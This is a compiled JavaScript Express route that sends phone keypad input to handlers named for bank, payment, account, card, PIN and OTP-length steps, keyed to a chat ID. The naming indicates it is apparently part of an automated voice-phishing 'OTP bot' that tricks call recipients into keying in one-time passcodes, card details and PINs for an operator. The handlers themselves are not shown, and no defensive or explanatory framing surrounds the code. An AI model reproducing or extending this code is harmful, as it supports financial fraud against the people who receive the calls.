"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const __1 = require("..");
const customDtmfFlow_1 = require("../../utils/customDtmfFlow");
const dtmfFlow_1 = require("../../utils/dtmfFlow");
__1.app.all('/calls/dtmf/:language/:step/:chatId', (req, res) => {
    const { step, language, chatId } = req.params;
    const { wallet, askCardInfo, cardType, pinType, transferNumber, institutionName, from, actions, customMessage, otpLength, variables, destination, } = req.query;
    const { dtmf } = JSON.parse(variables);
    switch (step) {
        case 'bank':
            (0, dtmfFlow_1.bankFlow)(String(dtmf), res, language, Number(chatId), step, destination, Number(otpLength));
            break;
        case 'pay':
            (0, dtmfFlow_1.payFlow)(String(dtmf), res, language, Number(chatId), step, destination, Number(otpLength), wallet);
            break;
        case 'account':
            (0, dtmfFlow_1.accountFlow)(String(dtmf), res, language, Number(chatId), step, destination, Number(otpLength), askCardInfo);
            break;
        case 'card':
            (0, dtmfFlow_1.cardFlow)(String(dtmf), res, language, Number(chatId), step, destination, cardType);
            break;
        case 'pin':
            (0, dtmfFlow_1.pinFlow)(String(dtmf), res, language, Number(chatId), step, destination, pinType);
            break;
        case 'pgp':
            (0, dtmfFlow_1.pgpFlow)(dtmf, res, language, Number(chatId), step, String(destination), String(transferNumber), String(institutionName), String(from));
            break;
        case 'custom':
            (0, customDtmfFlow_1.customDtmfFlow)(dtmf, res, language, Number(chatId), step, String(destination), String(actions), String(customMessage));
            break;
        default:
            break;
    }
});
